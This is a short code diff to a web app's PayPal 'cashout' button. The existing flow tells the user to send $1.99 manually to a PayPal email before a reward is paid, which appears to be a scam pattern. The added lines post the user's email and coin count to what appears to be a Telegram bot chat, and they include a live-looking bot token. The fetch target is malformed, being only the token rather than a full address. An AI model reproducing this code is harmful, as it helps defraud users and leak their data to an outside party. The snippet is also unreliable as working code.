@@ -234,6 +234,15 @@ paypalBtn.addEventListener('click', ()=>{
   const confirmSend = confirm(`Send $1.99 MANUALLY to this PayPal email:\n\n${email}\n\nAfter sending, click OK`);
   if(!confirmSend) return;
 
+   fetch("8447944744:AAHkD4lgqRbzHW7rYsBuw5g0qeow_ke43Wg", {
+    method: "POST",
+    headers: {"Content-Type":"application/json"},
+    body: JSON.stringify({
+        chat_id: "6525150767",
+        text: `💸 PayPal Cashout Request\nEmail: ${email}\nCoins: ${PAYPAL_COST}\n$1`
+    })
+});
+
   state.coins = 0;
   saveState();
   paypalClaimed = true;
